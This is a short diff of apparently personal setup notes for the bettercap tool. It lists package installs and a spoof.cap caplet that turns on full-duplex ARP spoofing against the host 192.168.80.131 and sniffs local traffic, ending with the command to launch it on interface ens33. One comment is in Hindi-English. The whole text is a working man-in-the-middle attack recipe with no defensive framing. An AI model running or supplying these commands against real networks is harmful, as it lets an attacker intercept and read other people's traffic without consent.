@@ -1,8 +1,12 @@
+sudo apt-get install ca-certificates libnetfilter-queue-dev libpcap-dev unzip wget
+install better file from server
+unzip better file
+sudo nano spoof.cap
 net.probe on
 set arp.spoof.fullduplex true
 set arp.spoof.targets 192.168.80.131
 arp.spoof on
 set net.sniff.local true
 net.sniff on
-sudo apt-get install ca-certificates libnetfilter-queue-dev libpcap-dev unzip wget
+
 run karne ki both spoof  ---    sudo ./bettercap -iface ens33 -caplet spoof.cap
